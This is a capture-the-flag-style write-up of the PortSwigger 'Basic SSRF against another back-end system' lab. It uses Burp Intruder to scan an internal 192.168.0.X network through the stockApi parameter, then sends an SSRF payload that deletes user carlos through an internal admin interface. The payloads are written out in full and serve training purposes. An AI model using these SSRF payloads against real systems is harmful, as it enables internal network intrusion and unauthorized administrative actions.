# PortSwigger Lab: Basic SSRF Against Another Back-End System

## Objective

Exploit the SSRF vulnerability in the stock check functionality to locate an internal administration interface running on the `192.168.0.X` network and delete the user `carlos`.

---

## Vulnerability

The application uses the user-controlled `stockApi` parameter to fetch stock information from a back-end service. This allows an attacker to force the server to make requests to internal systems that are inaccessible from the Internet.

---

## Steps

### 1. Intercept the Stock Check Request

Browse to any product and click **Check Stock**.

Capture the request in Burp Suite and send it to Intruder.

Original request:

```http
POST /product/stock HTTP/2

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

---

### 2. Enumerate the Internal Network

Replace the `stockApi` value with:

```text
http://192.168.0.1:8080/admin
```

Highlight the final octet (`1`) and click **Add §** to mark it as the payload position:

```text
http://192.168.0.§1§:8080/admin
```

---

### 3. Configure Intruder Payloads

Set:

* **Payload Type:** Numbers
* **From:** 1
* **To:** 255
* **Step:** 1

Start the attack.

---

### 4. Identify the Admin Server

Sort the responses by **Status Code**.

Most requests return errors, but one response returns:

```text
200 OK
```

indicating the presence of the administration interface.

Suppose the successful host is:

```text
192.168.0.68
```

---

### 5. Send the Request to Repeater

Send the successful request to Burp Repeater and modify the path to:

```text
/admin/delete?username=carlos
```

Final payload:

```text
http://192.168.0.68:8080/admin/delete?username=carlos
```

Send the request.

The server accesses the internal administration interface and deletes the user `carlos`, solving the lab.

---

## Payloads Used

### Internal Network Scan

```text
http://192.168.0.§1§:8080/admin
```

### Delete User

```text
http://192.168.0.68:8080/admin/delete?username=carlos
```

---

## Explanation

The application trusted the user-supplied URL contained in the `stockApi` parameter. By exploiting this behavior, it was possible to force the server to communicate with internal hosts on the private network (`192.168.0.X`). After identifying the machine exposing the administration interface, the SSRF vulnerability was used to access the delete endpoint and remove the target user.

---

## Impact

An attacker can abuse the server's ability to communicate with internal systems to:

* Enumerate private networks.
* Access internal services.
* Bypass network restrictions.
* Perform unauthorized administrative actions.

---

